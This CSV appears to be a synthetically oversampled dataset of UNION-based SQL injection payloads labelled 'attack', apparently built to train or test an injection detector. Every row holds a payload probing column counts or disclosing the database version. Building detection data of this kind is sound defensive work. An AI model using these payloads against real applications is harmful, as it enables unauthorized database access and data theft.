id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000016,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000255,0.04041905310139365
SMOTE_000017,attack,union," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",nearest_attack_euclidean,R000062,0.7935922244761452
SMOTE_000018,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,2.17794404813004
SMOTE_000019,attack,union,"-5657'   )    )     )   union all select 8071,8071,8071,8071,8071,8071,8071,8071#",nearest_attack_euclidean,R000232,0.0
SMOTE_000020,attack,union,"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000182,0.7676992124176002
SMOTE_000021,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.0
SMOTE_000022,attack,union,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",nearest_attack_euclidean,R000267,0.936673797163733
SMOTE_000023,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000176,0.6311207035568152
SMOTE_000024,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000308,0.5834926495397621
SMOTE_000025,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000264,0.23687596271369937
SMOTE_000026,attack,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000018,0.47962969774315056
SMOTE_000027,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000240,1.0725274550665302
SMOTE_000028,attack,union,"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",nearest_attack_euclidean,R000237,1.5313644527795125
SMOTE_000029,attack,union,"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",nearest_attack_euclidean,R000133,0.0
SMOTE_000030,attack,union,"-8981%""   )    )     )   union all select 4538,4538,4538,4538,4538,4538,4538#",nearest_attack_euclidean,R000281,0.38847025136620783
SMOTE_000031,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000072,0.1059676081772586
SMOTE_000032,attack,union,"-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",nearest_attack_euclidean,R000124,0.9327165688358645
SMOTE_000033,attack,union,"1"" where 8978  =  8978 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000301,0.0919722315523312
SMOTE_000034,attack,union," select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",nearest_attack_euclidean,R000100,2.879970377661848
SMOTE_000035,attack,union," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000054,0.16669723469427225
SMOTE_000036,attack,union," select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",nearest_attack_euclidean,R000078,0.026332902571789565
SMOTE_000037,attack,union,"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",nearest_attack_euclidean,R000133,0.0
SMOTE_000038,attack,union,"-7796'  )   union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#",nearest_attack_euclidean,R000291,0.353067858254112
SMOTE_000039,attack,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",nearest_attack_euclidean,R000297,0.80251083812507
SMOTE_000040,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000207,0.6279113603282395
SMOTE_000041,attack,union,1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,nearest_attack_euclidean,R000213,1.4505643526134364
SMOTE_000042,attack,union,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",nearest_attack_euclidean,R000155,0.4135014365181315
SMOTE_000043,attack,union," select * from users where id  =  1 + @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000087,0.2794460141138022
SMOTE_000044,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000113,0.4612395533916106
SMOTE_000045,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000126,1.5409460346499608
SMOTE_000046,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000163,0.3980671409538086
SMOTE_000047,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,1.2392733040094683
SMOTE_000048,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000023,0.5068083165290153
SMOTE_000049,attack,union,"1'||  (  select 'aair' where 9234  =  9234 union all select null,null,null,null#",nearest_attack_euclidean,R000277,0.6688546065274822
SMOTE_000050,attack,union," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000035,0.29935271077070397
SMOTE_000051,attack,union," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000052,0.07746929932024442
SMOTE_000052,attack,union," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000061,0.7962107766478358
SMOTE_000053,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000223,0.010104796158706826
SMOTE_000054,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000160,0.07431276654163294
SMOTE_000055,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000247,0.12476903895024075
SMOTE_000056,attack,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",nearest_attack_euclidean,R000297,0.7989815748228487
SMOTE_000057,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000171,0.2109659866130497
SMOTE_000058,attack,union," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000014,0.9817858900536381
SMOTE_000059,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000273,1.2737471102020863
SMOTE_000060,attack,union,"-3130'   )    )     )   union all select 2886,2886,2886,2886,2886,2886,2886#",nearest_attack_euclidean,R000209,0.08235864727444894
SMOTE_000061,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000108,0.24855852515162444
SMOTE_000062,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.0
SMOTE_000063,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.0
SMOTE_000064,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000021,0.0
SMOTE_000065,attack,union,"1'   )    )    as umah where 3781  =  3781 union all select null,null,null,null#",nearest_attack_euclidean,R000196,0.7630795252762258
SMOTE_000066,attack,union,"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--",nearest_attack_euclidean,R000173,0.30061658886630055
SMOTE_000067,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000202,0.6790858903127289
SMOTE_000068,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000177,0.6327016532200007
SMOTE_000069,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000016,0.3787775636163462
SMOTE_000070,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000128,1.065419517457397
SMOTE_000071,attack,union," select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000103,0.41857686803275873
SMOTE_000072,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000172,0.5418984857756916
SMOTE_000073,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.9539565261486556
SMOTE_000074,attack,union," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",nearest_attack_euclidean,R000026,0.21170137654222548
SMOTE_000075,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000063,0.2270642779460303
SMOTE_000076,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000023,1.4739858670236918
SMOTE_000077,attack,union," select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000082,0.14588701171600388
SMOTE_000078,attack,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000071,0.061677423021371754
SMOTE_000079,attack,union,"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",nearest_attack_euclidean,R000167,0.8117648300473367
SMOTE_000080,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000223,0.7591763403091487
SMOTE_000081,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000231,0.37070383465523704
SMOTE_000082,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000021,0.020726848123721345
SMOTE_000083,attack,union,"1'   )    )    as umah where 3781  =  3781 union all select null,null,null,null#",nearest_attack_euclidean,R000196,0.7683701622530655
SMOTE_000084,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000247,0.4879694706570643
SMOTE_000085,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000127,1.3900675511360554
SMOTE_000086,attack,union,"-4317""   )    )    as nxvn where 2566  =  2566 union all select 2566,2566,2566#",nearest_attack_euclidean,R000295,0.7098394900178245
SMOTE_000087,attack,union," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",nearest_attack_euclidean,R000044,1.5198689076300582
SMOTE_000088,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,1.1157700370679382
SMOTE_000089,attack,union,-3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420#,nearest_attack_euclidean,R000186,0.719546965471787
SMOTE_000090,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,8.429369702178807e-08
SMOTE_000091,attack,union,"-6965'  )   union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--",nearest_attack_euclidean,R000304,0.837280721072271
SMOTE_000092,attack,union," select * from users where id  =  1 union select !<@,version  (    )   -- 1",nearest_attack_euclidean,R000105,0.9558558703443504
SMOTE_000093,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000139,1.3817534928750839
SMOTE_000094,attack,union,"1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",nearest_attack_euclidean,R000238,0.7951395738394015
SMOTE_000095,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000163,0.31383569199889083
SMOTE_000096,attack,union,"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",nearest_attack_euclidean,R000123,0.051407449890437704
SMOTE_000097,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000099,0.42736000106660343
SMOTE_000098,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000005,0.6064160681654205
SMOTE_000099,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000236,1.0869772439411247
SMOTE_000100,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000068,1.5473959464805325
SMOTE_000101,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000132,0.9954663828010082
SMOTE_000102,attack,union,"-3379  )   union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",nearest_attack_euclidean,R000168,0.5421998149590123
SMOTE_000103,attack,union," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000002,0.9469730102996126
SMOTE_000104,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000197,0.3569181410701933
SMOTE_000105,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000063,0.22655754945050288
SMOTE_000106,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000236,1.212046975228662
SMOTE_000107,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000076,0.5842098418422474
SMOTE_000108,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000121,0.7185751716130866
SMOTE_000109,attack,union,"-2784'   )    )    union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#",nearest_attack_euclidean,R000306,0.7750183926130345
SMOTE_000110,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.7706662315352514
SMOTE_000111,attack,union,"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",nearest_attack_euclidean,R000285,0.048962873642068264
SMOTE_000112,attack,union,"1   )    )    as huxq where 7451  =  7451 union all select null,null,null--",nearest_attack_euclidean,R000146,0.4890707859626998
SMOTE_000113,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000240,1.4018300227993146
SMOTE_000114,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000008,0.0
SMOTE_000115,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000253,0.9680296143952322
SMOTE_000116,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000163,1.4150206658912723
SMOTE_000117,attack,union,-3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420#,nearest_attack_euclidean,R000186,0.04146163096807539
SMOTE_000118,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.0
SMOTE_000119,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000219,1.4025981946331265
SMOTE_000120,attack,union,"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",nearest_attack_euclidean,R000148,0.31763678355326747
SMOTE_000121,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000008,0.29325041318431216
SMOTE_000122,attack,union,"-3885  )   where 2387  =  2387 union all select 2387,2387,2387,2387,2387,2387,2387#",nearest_attack_euclidean,R000141,0.01844414021473557
SMOTE_000123,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000088,0.22763529815870523
SMOTE_000124,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.6924746163835199
SMOTE_000125,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R000138,0.0373696396800101
SMOTE_000126,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.16287107347306368
SMOTE_000127,attack,union,"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",nearest_attack_euclidean,R000167,2.1548638471879875
SMOTE_000128,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000006,0.014443189585569702
SMOTE_000129,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000216,1.0276153847419511
SMOTE_000130,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000159,1.9106511810997444
SMOTE_000131,attack,union,"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",nearest_attack_euclidean,R000220,1.2388576003174825
SMOTE_000132,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000072,0.0
SMOTE_000133,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000250,0.3831262449239877
SMOTE_000134,attack,union,"-4091   )    )    as lqqy where 3030  =  3030 union all select 3030,3030,3030#",nearest_attack_euclidean,R000149,0.9975641350064404
SMOTE_000135,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000036,0.0
SMOTE_000136,attack,union,"-4679 where 9634  =  9634 union all select 9634,9634,9634,9634,9634,9634,9634--",nearest_attack_euclidean,R000296,0.3553992629071999
SMOTE_000137,attack,union," select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000081,0.6529893002834747
SMOTE_000138,attack,union,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",nearest_attack_euclidean,R000155,0.5990349911263604
SMOTE_000139,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000156,0.26996814293702376
SMOTE_000140,attack,union,"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",nearest_attack_euclidean,R000133,0.013189819239206379
SMOTE_000141,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000230,0.6702499504353261
SMOTE_000142,attack,union,"1   )    )    as huxq where 7451  =  7451 union all select null,null,null--",nearest_attack_euclidean,R000146,0.7905126102415618
SMOTE_000143,attack,union,"-9140""   )    )    union all select 1623,1623,1623,1623,1623,1623,1623,1623,1623#",nearest_attack_euclidean,R000151,0.5606696040958561
SMOTE_000144,attack,union," select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000058,5.944020715332602e-05
SMOTE_000145,attack,union,"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",nearest_attack_euclidean,R000237,0.07597731656142388
SMOTE_000146,attack,union,"-4317""   )    )    as nxvn where 2566  =  2566 union all select 2566,2566,2566#",nearest_attack_euclidean,R000295,0.18116749368850757
SMOTE_000147,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000019,0.0
SMOTE_000148,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.0
SMOTE_000149,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000102,1.6558394885472436
SMOTE_000150,attack,union,"-7796'  )   union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#",nearest_attack_euclidean,R000291,0.07902098633754642
SMOTE_000151,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000307,0.1048928834015525
SMOTE_000152,attack,union," select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000079,0.027131516450758567
SMOTE_000153,attack,union,"-2434'   )    )     )   union all select 5509,5509,5509,5509,5509,5509,5509--",nearest_attack_euclidean,R000210,0.5406493794243112
SMOTE_000154,attack,union,"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",nearest_attack_euclidean,R000123,1.551114920221924
SMOTE_000155,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000257,0.7098568724351407
SMOTE_000156,attack,union,"-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#",nearest_attack_euclidean,R000212,0.4671356064881313
SMOTE_000157,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000108,0.4957660203098851
SMOTE_000158,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000136,0.5124092674602077
SMOTE_000159,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,0.7930500636966854
SMOTE_000160,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000177,0.09902725481029281
SMOTE_000161,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000125,0.9074663482174136
SMOTE_000162,attack,union,"-2704""  )   union all select 1323,1323,1323,1323,1323,1323,1323,1323,1323--",nearest_attack_euclidean,R000235,0.5601132144100945
SMOTE_000163,attack,union,"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",nearest_attack_euclidean,R000133,0.010744180575269002
SMOTE_000164,attack,union,"-1999  )   union all select 1779,1779,1779,1779,1779,1779,1779,1779,1779,1779#",nearest_attack_euclidean,R000310,0.3803494491039068
SMOTE_000165,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000006,1.4048905834360652
SMOTE_000166,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000303,0.7806571565181989
SMOTE_000167,attack,union," select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000103,0.20772760328093554
SMOTE_000168,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000302,0.16568538095249755
SMOTE_000169,attack,union," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000024,0.024048444731580798
SMOTE_000170,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000128,0.7997548065220035
SMOTE_000171,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R000286,0.6092995821914869
SMOTE_000172,attack,union,"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",nearest_attack_euclidean,R000220,0.4522456031154104
SMOTE_000173,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000215,0.4228142632468816
SMOTE_000174,attack,union,"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",nearest_attack_euclidean,R000154,0.00714816565243727
SMOTE_000175,attack,union,"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--",nearest_attack_euclidean,R000173,0.7488891168697742
SMOTE_000176,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000077,7.248090565027149
SMOTE_000177,attack,union,"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#",nearest_attack_euclidean,R000161,0.11309752438178496
SMOTE_000178,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000019,0.0
SMOTE_000179,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000240,0.6815041387697621
SMOTE_000180,attack,union,"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",nearest_attack_euclidean,R000133,0.03002287748587409
SMOTE_000181,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000126,0.10995771694704895
SMOTE_000182,attack,union," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000053,0.8943154880073231
SMOTE_000183,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000178,0.21622218155471665
SMOTE_000184,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000119,0.8191173447415889
SMOTE_000185,attack,union,"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",nearest_attack_euclidean,R000184,0.9941310882478713
SMOTE_000186,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000222,0.6450174873041309
SMOTE_000187,attack,union," select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000045,0.28021812160250803
SMOTE_000188,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000008,0.009221555890224433
